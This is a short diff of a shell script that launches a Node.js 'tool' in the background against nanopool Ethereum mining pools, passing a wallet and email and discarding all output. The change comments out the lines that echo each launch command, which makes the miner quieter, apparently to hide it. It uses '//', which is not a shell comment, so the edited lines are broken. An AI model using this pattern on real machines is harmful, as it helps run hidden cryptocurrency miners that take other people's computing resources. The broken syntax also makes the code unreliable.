@@ -7,10 +7,10 @@ metka="x"
 
 
 tek="nohup nodejs /home/user/tool/tool.js 9"$name"1 eth-eu1.nanopool.org:9999 "$wallet" "$metka" "$mail">/dev/null 2>&1 &"
-echo $tek
+//echo $tek
 eval $tek
 
 tek="nohup nodejs /home/user/tool/tool.js 9"$name"2 eth-eu2.nanopool.org:9999 "$wallet" "$metka" "$mail">/dev/null 2>&1 &"
-echo $tek
+//echo $tek
 eval $tek
 
